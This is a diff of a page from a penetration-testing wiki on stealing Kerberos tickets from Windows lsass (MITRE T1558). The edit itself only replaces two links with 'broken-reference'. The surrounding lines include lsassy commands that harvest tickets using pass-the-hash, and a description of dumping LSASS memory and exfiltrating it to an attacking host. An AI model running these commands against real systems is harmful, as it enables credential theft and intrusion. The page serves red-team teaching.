@@ -6,7 +6,7 @@ description: MITRE ATT&CK™ Steal or Forge Kerberos Tickets - Technique T1558
 
 ## Theory
 
-In Windows, [Kerberos](../../../persistence/kerberos/) tickets are **handled and stored by the** [**lsass** (Local Security Authority Subsystem Service)](lsass/) process, which is responsible for security. Hence, to retrieve tickets from a Windows system, it is necessary to **communicate with lsass and ask for them**. As a **non-administrative user only owned tickets can be fetched**, however, as machine **administrator**, **all** of them can be harvested using tools like **Mimikatz, Rubeus** or **Giuda.**
+In Windows, [Kerberos](../../../persistence/kerberos/) tickets are **handled and stored by the** [**lsass** (Local Security Authority Subsystem Service)](broken-reference) process, which is responsible for security. Hence, to retrieve tickets from a Windows system, it is necessary to **communicate with lsass and ask for them**. As a **non-administrative user only owned tickets can be fetched**, however, as machine **administrator**, **all** of them can be harvested using tools like **Mimikatz, Rubeus** or **Giuda.**
 
 ## Practice
 
@@ -51,7 +51,7 @@ lsassy -d <DOMAIN.LOCAL> -u <USER> -H <NTHash> <TARGET> -K '/tmp/kerberos_ticket
 lsassy -k <TARGET> -K '/tmp/kerberos_tickets'
 ```
 
-We also can do it manually by dumping LSASS memory using one of [this techniques](lsass/), exfiltrate the dump on our attacking machine, and then retrieve tickets using [pypykatz](https://github.com/skelsec/pypykatz).
+We also can do it manually by dumping LSASS memory using one of [this techniques](broken-reference), exfiltrate the dump on our attacking machine, and then retrieve tickets using [pypykatz](https://github.com/skelsec/pypykatz).
 
 ```bash
 # Example of a dump where Z: is mounted on the attacking host
